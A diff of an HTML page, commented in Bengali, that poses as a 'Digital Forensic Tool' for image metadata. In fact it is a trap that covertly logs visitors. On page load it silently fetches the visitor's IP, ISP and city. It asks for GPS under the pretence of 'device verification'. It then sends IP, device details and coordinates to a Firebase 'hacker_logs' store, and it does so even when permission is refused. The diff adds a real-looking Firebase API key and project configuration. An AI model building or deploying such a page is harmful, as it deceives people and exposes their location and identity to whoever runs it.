@@ -3,71 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Secure Proof Maker (Trap)</title>
+    <title>Secure Image Proof (Trap)</title>
+    <!-- Piexif Library for Metadata -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
     
+    <!-- Firebase SDK Setup -->
     <script type="module">
-        // Firebase কনফিগারেশন (তোর নিজেরটা এখানে বসাবি)
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
         import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
+        // তোর দেওয়া কনফিগারেশন
         const firebaseConfig = {
-            apiKey: "AIzaSyDxxxxxxxxx...",  // তোর API Key
-            authDomain: "your-app.firebaseapp.com",
-            databaseURL: "https://your-app-default-rtdb.firebaseio.com", // তোর ডাটাবেস URL
-            projectId: "your-app-id",
-            storageBucket: "your-app.appspot.com",
-            messagingSenderId: "123456789",
-            appId: "1:123456789:web:xxxxxx"
+            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
+            authDomain: "location-611d6.firebaseapp.com",
+            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
+            projectId: "location-611d6",
+            storageBucket: "location-611d6.firebasestorage.app",
+            messagingSenderId: "903100559116",
+            appId: "1:903100559116:web:08c8c9e1d7282048116329"
         };
 
         // Firebase শুরু করা
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ডাটাবেসে তথ্য পাঠানোর ফাংশন (Global Scope এ আনার জন্য window তে সেট করলাম)
+        // ডাটাবেসে তথ্য পাঠানোর ফাংশন
         window.sendDataToFirebase = function(data) {
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
+            
             set(newLogRef, {
                 timestamp: new Date().toString(),
                 ...data
             }).then(() => {
-                console.log("Data logged silently!");
+                console.log("Target Locked: Data sent to Firebase!");
             }).catch((error) => {
-                console.error("Error logging data: ", error);
+                console.error("Firebase Error: ", error);
             });
         }
     </script>
 
     <style>
-        /* তোর আগের স্টাইলই রেখেছি, ওটা সুন্দর ছিল */
-        :root { --bg-color: #e0e5ec; --text-color: #4a4a4a; --shadow-light: #ffffff; --shadow-dark: #a3b1c6; --accent: #007bff; --success: #00b894; --danger: #ff4757; }
-        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .mobile-container { width: 90%; max-width: 400px; background-color: var(--bg-color); border-radius: 20px; padding: 20px; box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light); min-height: 600px; text-align: center; }
+        /* Neumorphism Design Style */
+        :root { 
+            --bg-color: #e0e5ec; 
+            --text-color: #4a4a4a; 
+            --shadow-light: #ffffff; 
+            --shadow-dark: #a3b1c6; 
+            --accent: #007bff; 
+            --success: #00b894; 
+            --danger: #ff4757; 
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            color: var(--text-color); 
+            font-family: 'Segoe UI', sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; margin: 0; 
+        }
+
+        .mobile-container { 
+            width: 90%; max-width: 400px; 
+            background-color: var(--bg-color); 
+            border-radius: 20px; padding: 20px; 
+            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light); 
+            min-height: 600px; text-align: center; position: relative;
+        }
+
         h2 { text-align: center; color: var(--text-color); margin-bottom: 20px; }
-        .neu-btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--bg-color); box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); color: var(--text-color); font-weight: bold; font-size: 16px; cursor: pointer; outline: none; transition: 0.2s; margin-bottom: 15px; }
+        
+        /* Buttons */
+        .neu-btn { 
+            width: 100%; padding: 15px; border: none; border-radius: 12px; 
+            background: var(--bg-color); 
+            box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); 
+            color: var(--text-color); font-weight: bold; font-size: 16px; 
+            cursor: pointer; outline: none; transition: 0.2s; margin-bottom: 15px; 
+        }
         .neu-btn:active { box-shadow: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light); }
-        .neu-btn:disabled { color: #aaa; box-shadow: none; cursor: not-allowed; }
-        .btn-select { color: var(--accent); } .btn-save { color: var(--success); }
-        .upload-area { text-align: center; padding: 20px; border-radius: 15px; box-shadow: inset 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); margin-bottom: 25px; }
+        .neu-btn:disabled { color: #aaa; box-shadow: none; cursor: not-allowed; opacity: 0.6; }
+
+        .btn-select { color: var(--accent); } 
+        .btn-save { color: var(--success); }
+
+        /* Upload Area */
+        .upload-area { 
+            text-align: center; padding: 20px; border-radius: 15px; 
+            box-shadow: inset 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); 
+            margin-bottom: 25px; 
+        }
+        
         input[type="file"] { display: none; }
-        #preview { width: 150px; height: 150px; object-fit: contain; border-radius: 10px; margin-top: 15px; display: none; box-shadow: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light); border: 3px solid var(--bg-color); margin-left: auto; margin-right: auto; }
-        .status-box { padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; font-weight: bold; display: none; }
+        
+        #preview { 
+            width: 100%; max-width: 200px; height: auto; object-fit: contain; border-radius: 10px; 
+            margin-top: 15px; display: none; 
+            box-shadow: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light); 
+            border: 3px solid var(--bg-color); 
+            margin-left: auto; margin-right: auto; 
+        }
+
+        /* Status & Logs */
+        .status-box { 
+            padding: 15px; border-radius: 12px; margin-bottom: 20px; 
+            font-size: 14px; font-weight: bold; display: none; 
+        }
         .status-ok { color: var(--success); box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); }
-        .status-error { color: var(--danger); }
+        .status-error { color: var(--danger); box-shadow: inset 3px 3px 6px var(--shadow-dark), inset -3px -3px 6px var(--shadow-light); }
+
+        /* Custom Modal (Alert Replacement) */
+        .custom-modal {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 80%; background: var(--bg-color); padding: 20px;
+            border-radius: 15px; 
+            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
+            z-index: 100; display: none; flex-direction: column; align-items: center;
+        }
+        .custom-modal p { margin-bottom: 20px; font-weight: bold; }
+        .modal-btn { width: auto; padding: 10px 20px; margin: 0; color: var(--accent); }
+
     </style>
 </head>
 <body>
 
     <div class="mobile-container">
-        <h2>🔍 Digital Evidence Tool</h2>
-        <p style="font-size: 12px; color: #666;">Secure Image Metadata Injector</p>
+        <!-- Custom Alert Modal -->
+        <div id="customModal" class="custom-modal">
+            <p id="modalMsg">Message here</p>
+            <button class="neu-btn modal-btn" onclick="closeModal()">OK</button>
+        </div>
+
+        <h2>🕵️ Digital Forensic Tool</h2>
+        <p style="font-size: 12px; color: #666; margin-top:-10px;">Secure Metadata Analysis & Logger</p>
 
         <div class="upload-area">
             <input type="file" id="fileInput" accept="image/jpeg, image/jpg, image/png">
             <button class="neu-btn btn-select" onclick="document.getElementById('fileInput').click()">
-                📂 ছবি সিলেক্ট করুন
+                📂 ছবি আপলোড করুন
             </button>
             <img id="preview" src="">
         </div>
@@ -76,25 +149,30 @@
 
         <div id="actionButtons" style="display:none;">
             <button id="saveBtn" class="neu-btn btn-save" onclick="processAndTrap()" disabled>
-                💾 প্রসেস এবং সেভ করুন
+                💾 এভিডেন্স সেভ করুন (Save)
             </button>
+            <p style="font-size:11px; color:#888;">*IP & Location will be embedded securely.</p>
         </div>
     </div>
 
     <script>
         let currentImgData = null;
-        let userLat = null; let userLng = null;
-        let ipData = {};
+        let userLat = null; 
+        let userLng = null;
+        let ipData = { ip: "Tracing...", city: "Tracing...", org: "Tracing..." };
 
-        // ১. আইপি এড্রেস এবং নেটওয়ার্ক ইনফো বের করা (API দিয়ে)
+        // ১. পেজ লোড হওয়ার সাথে সাথেই আইপি খোঁজা শুরু (IP Logger)
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
                 ipData = data;
-                console.log("Network Info Captured");
+                console.log("Network Info Captured silently.");
+                // লোকেশন পারমিশন ছাড়াই প্রাথমিক আইপি ডাটা পাঠানো
+                logToFirebase(false, "Page Load - IP Captured");
             })
             .catch(error => console.log("IP Fetch Error"));
 
+        // ২. ছবি ইমপুট হ্যান্ডলিং
         document.getElementById('fileInput').addEventListener('change', function(e) {
             let file = e.target.files[0];
             if (file) {
@@ -105,63 +183,72 @@
                     document.getElementById('preview').style.display = 'block';
                     document.getElementById('actionButtons').style.display = 'block';
                     
-                    // ছবি সিলেক্ট করলেই পারমিশন চাওয়া শুরু হবে
-                    checkLocation();
+                    // ছবি দিলেই লোকেশন চাওয়া হবে
+                    requestLocation();
                 }
                 reader.readAsDataURL(file);
             }
         });
 
-        function checkLocation() {
+        // ৩. লোকেশন রিকোয়েস্ট
+        function requestLocation() {
             let statusBox = document.getElementById('statusBox');
             statusBox.style.display = 'block';
-            statusBox.innerText = "⏳ লোকেশন এবং ডিভাইস ভেরিফাই হচ্ছে...";
+            statusBox.className = 'status-box';
+            statusBox.innerText = "⏳ ডিভাইস ভেরিফিকেশন চলছে (GPS)...";
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         userLat = position.coords.latitude;
                         userLng = position.coords.longitude;
+                        
                         document.getElementById('saveBtn').disabled = false;
                         statusBox.className = 'status-box status-ok';
-                        statusBox.innerHTML = `✅ ডিভাইস ভেরিফাইড! <br> সেভ করার জন্য প্রস্তুত।`;
+                        statusBox.innerHTML = `✅ ভেরিফাইড ইউজার! <br> <span style="font-size:11px">GPS: ${userLat.toFixed(4)}, ${userLng.toFixed(4)}</span>`;
                         
-                        // লোকেশন পাওয়ার সাথে সাথেই চুপিসারে Firebase এ পাঠিয়ে দেব
-                        logToFirebase(); 
+                        // লোকেশন পাওয়ার সাথে সাথেই Firebase এ পাঠানো (Main Trap)
+                        logToFirebase(true, "GPS Permission Granted");
                     },
                     function(error) {
-                        statusBox.innerText = "❌ লোকেশন পারমিশন দিন, নাহলে কাজ করবে না।";
-                        // লোকেশন না দিলেও আইপি এড্রেস পাঠিয়ে দেব
-                        logToFirebase(false); 
+                        statusBox.className = 'status-box status-error';
+                        statusBox.innerText = "❌ লোকেশন অ্যাক্সেস পাওয়া যায়নি।";
+                        showModal("সতর্কতা: লোকেশন অফ থাকলে প্রুফ ভেরিফাইড হবে না।");
+                        
+                        // লোকেশন ডিনাই করলেও লগ পাঠানো হবে
+                        logToFirebase(false, "GPS Permission Denied");
                     },
                     { enableHighAccuracy: true }
                 );
+            } else {
+                showModal("আপনার ডিভাইসে জিপিএস নেই!");
             }
         }
 
-        function logToFirebase(hasLocation = true) {
+        // ৪. ফায়ারভেজে ডাটা পাঠানোর লজিক
+        function logToFirebase(hasLocation, statusMsg) {
             let deviceLog = {
                 ip: ipData.ip || "Unknown",
                 city: ipData.city || "Unknown",
-                isp: ipData.org || "Unknown",
-                userAgent: navigator.userAgent,
+                isp: ipData.org || "Unknown", // হ্যাকারের ইন্টারনেট প্রোভাইডার
+                userAgent: navigator.userAgent, // ব্রাউজার ও ডিভাইসের তথ্য
                 platform: navigator.platform,
-                latitude: hasLocation ? userLat : "Denied",
-                longitude: hasLocation ? userLng : "Denied",
-                status: hasLocation ? "Success - Full Info" : "Partial - No GPS"
+                latitude: hasLocation ? userLat : "Not Allowed",
+                longitude: hasLocation ? userLng : "Not Allowed",
+                actionStatus: statusMsg,
+                captureTime: new Date().toLocaleString()
             };
 
-            // Firebase এ ডাটা পাঠানো হচ্ছে (ফাংশনটি উপরে মডিউলে ডিফাইন করা আছে)
+            // গ্লোবাল ফাংশন কল (যেটা মডিউলে আছে)
             if(window.sendDataToFirebase) {
                 window.sendDataToFirebase(deviceLog);
             }
         }
 
+        // ৫. ইমেজ প্রসেসিং এবং মেটাডাটা ইনজেকশন
         function processAndTrap() {
-            // আগের মতই ইমেজে মেটাডাটা ইনজেক্ট করা হচ্ছে
-            // যাতে ডাউনলোড করা ফাইলে প্রমাণ থাকে
             if (!currentImgData || !userLat) {
-                alert("লোকেশন ছাড়া প্রুফ তৈরি হবে না!");
+                showModal("লোকেশন ডাটা ছাড়া সেভ করা সম্ভব না!");
                 return;
             }
 
@@ -169,10 +256,12 @@
             let exif = {};
             let gps = {};
 
-            zeroth[piexif.ImageIFD.Make] = ipData.org || "Unknown ISP"; // হ্যাকারের ইন্টারনেট প্রভাইডার নাম
-            zeroth[piexif.ImageIFD.Model] = ipData.ip || "IP Address"; // হ্যাকারের আইপি
-            
-            // GPS সেটআপ
+            // ডিভাইসের মডেলের জায়গায় হ্যাকারের আইপি বসিয়ে দেওয়া হচ্ছে
+            zeroth[piexif.ImageIFD.Make] = ipData.org || "ISP Tracker"; 
+            zeroth[piexif.ImageIFD.Model] = ipData.ip || "Target IP";
+            zeroth[piexif.ImageIFD.Software] = "Forensic Tool v1.0";
+
+            // জিপিএস ডাটা এনকোডিং
             gps[piexif.GPSIFD.GPSLatitudeRef] = userLat < 0 ? 'S' : 'N';
             gps[piexif.GPSIFD.GPSLatitude] = piexif.GPSHelper.degToDmsRational(Math.abs(userLat));
             gps[piexif.GPSIFD.GPSLongitudeRef] = userLng < 0 ? 'W' : 'E';
@@ -180,14 +269,29 @@
 
             let exifObj = {"0th": zeroth, "Exif": exif, "GPS": gps};
             let exifStr = piexif.dump(exifObj);
+            
+            // ছবিতে ডাটা ঢুকিয়ে নতুন ইমেজ তৈরি
             let newImage = piexif.insert(exifStr, currentImgData);
 
+            // অটোমেটিক ডাউনলোড
             let link = document.createElement('a');
             link.href = newImage;
-            link.download = "Evidence_" + Date.now() + ".jpg";
+            link.download = "Forensic_Evidence_" + Date.now() + ".jpg";
             link.click();
             
-            alert("✅ তথ্য সফলভাবে সংগ্রহ করা হয়েছে!");
+            showModal("🎉 এভিডেন্স সফলভাবে কালেক্ট করা হয়েছে!");
+            
+            // শেষবারের মত কনফার্মেশন লগ
+            logToFirebase(true, "File Downloaded - Full Success");
+        }
+
+        // কাস্টম মোডাল ফাংশন
+        function showModal(msg) {
+            document.getElementById('modalMsg').innerText = msg;
+            document.getElementById('customModal').style.display = 'flex';
+        }
+        function closeModal() {
+            document.getElementById('customModal').style.display = 'none';
         }
     </script>
 </body>
